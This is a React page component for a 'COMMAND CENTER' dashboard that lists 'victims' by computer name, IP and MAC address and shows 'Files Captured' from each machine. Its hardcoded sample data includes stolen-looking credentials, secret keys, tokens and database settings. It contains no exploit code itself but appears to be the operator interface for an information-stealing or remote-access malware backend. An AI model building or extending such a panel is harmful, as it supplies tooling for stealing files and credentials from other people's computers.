import { useState } from "react";
import { Monitor, FileText, Globe, HardDrive } from "lucide-react";
import StatCard from "@/components/StatCard";
import VictimCard from "@/components/VictimCard";
import VictimList from "@/components/VictimList";
import FileTable from "@/components/FileTable";

const data = {
  count: 3,
  victims: [
    {
      computer_name: "DESKTOP-01",
      created_at: "2026-02-11T14:12:59.693021",
      files: [
        { content: "hello", created_at: "2026-02-11T14:12:59.709109", id: 1, name: "a.txt", path: "C:/tmp/a.txt", updated_at: "2026-02-11T14:12:59.709119", victim_id: 1 },
        { content: "world", created_at: "2026-02-11T14:12:59.709122", id: 2, name: "b.txt", path: "C:/tmp/b.txt", updated_at: "2026-02-11T14:12:59.709125", victim_id: 1 },
      ],
      id: 1,
      ip: "192.168.1.50",
      mac_address: "AA:BB:CC:DD:EE:FF",
      updated_at: "2026-02-11T14:12:59.693061",
    },
    {
      computer_name: "WORKSTATION-07",
      created_at: "2026-02-11T15:30:12.123456",
      files: [
        { content: "secret_key=abc123", created_at: "2026-02-11T15:30:12.234567", id: 3, name: "config.ini", path: "C:/Users/Admin/config.ini", updated_at: "2026-02-11T15:30:12.234570", victim_id: 2 },
        { content: "password: hunter2", created_at: "2026-02-11T15:31:00.111111", id: 4, name: "creds.txt", path: "C:/Users/Admin/creds.txt", updated_at: "2026-02-11T15:31:00.111115", victim_id: 2 },
        { content: "db_host=10.0.0.5", created_at: "2026-02-11T15:32:00.222222", id: 5, name: "db.env", path: "C:/Projects/db.env", updated_at: "2026-02-11T15:32:00.222225", victim_id: 2 },
      ],
      id: 2,
      ip: "10.0.0.12",
      mac_address: "11:22:33:44:55:66",
      updated_at: "2026-02-11T15:32:00.222230",
    },
    {
      computer_name: "LAPTOP-MARS",
      created_at: "2026-02-11T16:45:30.555555",
      files: [
        { content: "token=xyz789", created_at: "2026-02-11T16:45:30.666666", id: 6, name: "auth.json", path: "D:/app/auth.json", updated_at: "2026-02-11T16:45:30.666670", victim_id: 3 },
      ],
      id: 3,
      ip: "172.16.0.88",
      mac_address: "FF:EE:DD:CC:BB:AA",
      updated_at: "2026-02-11T16:45:30.666675",
    },
  ],
};

const totalFiles = data.victims.reduce((acc, v) => acc + v.files.length, 0);

const Index = () => {
  const [selectedId, setSelectedId] = useState<number>(data.victims[0]?.id ?? 0);
  const selectedVictim = data.victims.find((v) => v.id === selectedId);

  return (
    <div className="relative min-h-screen">
      <div className="starfield" />

      <div className="relative z-10 mx-auto max-w-7xl px-6 py-10">
        {/* Header */}
        <div className="mb-10">
          <h1 className="font-display text-3xl font-black tracking-wider text-foreground md:text-4xl">
            <span className="text-primary">◆</span> COMMAND CENTER
          </h1>
          <p className="mt-1 font-mono-space text-sm text-muted-foreground">
            System monitoring &middot; Real-time telemetry
          </p>
        </div>

        {/* Stats */}
        <div className="mb-8 grid grid-cols-1 gap-4 sm:grid-cols-2 lg:grid-cols-4">
          <StatCard label="Total Targets" value={data.count} icon={Monitor} variant="primary" />
          <StatCard label="Files Captured" value={totalFiles} icon={FileText} variant="secondary" />
          <StatCard label="Active IPs" value={data.victims.length} icon={Globe} variant="success" />
          <StatCard label="Storage" value={`${totalFiles} items`} icon={HardDrive} variant="warning" />
        </div>

        {/* Victim List + Detail */}
        <div className="grid gap-6 lg:grid-cols-12">
          <div className="lg:col-span-4">
            <VictimList victims={data.victims} selectedId={selectedId} onSelect={setSelectedId} />
          </div>
          <div className="lg:col-span-8 space-y-6">
            {selectedVictim && (
              <>
                <VictimCard {...selectedVictim} />
                <FileTable files={selectedVictim.files} />
              </>
            )}
          </div>
        </div>
      </div>
    </div>
  );
};

export default Index;
